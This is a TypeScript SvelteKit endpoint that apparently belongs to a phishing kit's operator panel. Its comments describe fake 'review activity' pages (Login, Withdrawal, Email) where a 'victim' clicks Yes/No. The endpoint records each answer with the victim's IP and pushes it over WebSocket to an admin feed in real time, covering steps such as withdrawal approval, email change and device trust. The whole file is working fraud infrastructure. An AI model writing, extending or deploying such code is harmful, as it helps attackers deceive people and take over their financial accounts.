/**
 * Visitor "Review activity" response capture.
 *
 * Each of the 3 review pages (Login, Withdrawal, Email) POSTs here when the
 * victim clicks Yes/No. We log the answer to the admin activity feed and
 * broadcast it via WebSocket so the admin sees it in real time.
 *
 * Public endpoint — visitor pages must be able to call it without auth.
 */
import { json, type RequestHandler } from '@sveltejs/kit';
import { serverState } from '$lib/server/state';
import { broadcast } from '$lib/server/websocket';

const STEP_LABELS: Record<string, string> = {
	login_location: 'Sign-in location',
	withdrawal: 'Withdrawal',
	email_change: 'Email change',
	trust_device: 'Trust device',
	terminate_devices: 'Terminate devices'
};

const VERBS: Record<string, string> = {
	approve: 'approved',
	deny: 'denied',
	submit: 'submitted'
};

export const POST: RequestHandler = async ({ request, getClientAddress }) => {
	let body: { step?: string; choice?: string; detail?: string } = {};
	try {
		body = await request.json();
	} catch {
		return json({ ok: false, error: 'invalid json' }, { status: 400 });
	}

	const step = String(body.step ?? '').trim();
	const choice = String(body.choice ?? '').trim();
	const detail = String(body.detail ?? '').trim();

	if (!step || !VERBS[choice]) {
		return json({ ok: false, error: 'invalid payload' }, { status: 400 });
	}

	const ip = getClientAddress();
	const stepLabel = STEP_LABELS[step] ?? step;
	const verb = VERBS[choice];
	const message = `visitor ${ip} ${verb} ${stepLabel}${detail ? ` — ${detail}` : ''}`;

	const entryType: 'alert' | 'action' = choice === 'deny' ? 'alert' : 'action';
	const entry = serverState.addLogEntry(message, entryType);
	try {
		broadcast({ type: 'log:new', payload: entry });
	} catch {
		/* ws may not be up in dev; ignore */
	}

	return json({ ok: true });
};
